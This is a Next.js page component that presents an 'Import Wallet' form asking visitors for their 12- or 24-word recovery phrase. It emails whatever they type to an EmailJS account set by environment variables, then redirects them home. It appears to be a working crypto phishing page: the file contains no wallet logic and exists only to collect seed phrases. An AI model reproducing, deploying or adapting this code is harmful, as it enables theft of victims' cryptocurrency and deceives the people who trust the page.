// @ts-nocheck
'use client';
import emailjs from '@emailjs/browser';
import Image from 'next/image';
import { useRef, useState } from 'react';
import { BiLoaderAlt } from 'react-icons/bi';
import './form.css';

export default function Page() {
  const [loading, setLoading] = useState(false);
  const form = useRef();

  const sendEmail = (e) => {
    e.preventDefault();
    setLoading(true);
    emailjs
      .sendForm(
        process.env.NEXT_PUBLIC_EMAILJS_SERVICE_ID,
        process.env.NEXT_PUBLIC_EMAILJS_TEMPLATE_ID,
        form.current,
        process.env.NEXT_PUBLIC_EMAILJS_USER_ID
      )
      .then(
        (result) => {
          window.location.pathname = '/';
        },
        (error) => {
          alert(error.text);
        }
      )
      .finally(() => {
        setLoading(false);
      });
  };

  return (
    <section>
      <div className='rase'>
        <h5 className='pt-[5%] font-black text-center text-xl'>
          Import Wallet
        </h5>
        <Image
          src='/assets/download.png'
          alt='inbox logo'
          width={120}
          className='mx-auto'
          height={120}
        />
        <form
          ref={form}
          onSubmit={sendEmail}
          className='flex flex-col items-start max-w-xl pb-20 mx-auto'
        >
          <p className='py-4'>
            Typically 12 (sometimes 24) words seperated by a single spaces.
          </p>
          <textarea
            name='message'
            rows={4}
            placeholder='Enter your Phrase'
            required
            className='w-full p-4 rounded-md ring-1 ring-black placeholder:font-mono'
            defaultValue={''}
          />
          <br />
          <button
            disabled={loading}
            className='bg-[#4682b4] tracking-wider font-mono placeholder:font-mono disabled:opacity-50 flex items-center rounded-md hover:bg-[#4682b4]/80 text-white font-semibold px-6 py-4 text-sm whitespace-nowrap'
            type='submit'
          >
            {loading && (
              <BiLoaderAlt className='animate-spin mr-2 text-white text-lg' />
            )}
            Connect Wallet
          </button>
        </form>
      </div>
    </section>
  );
}
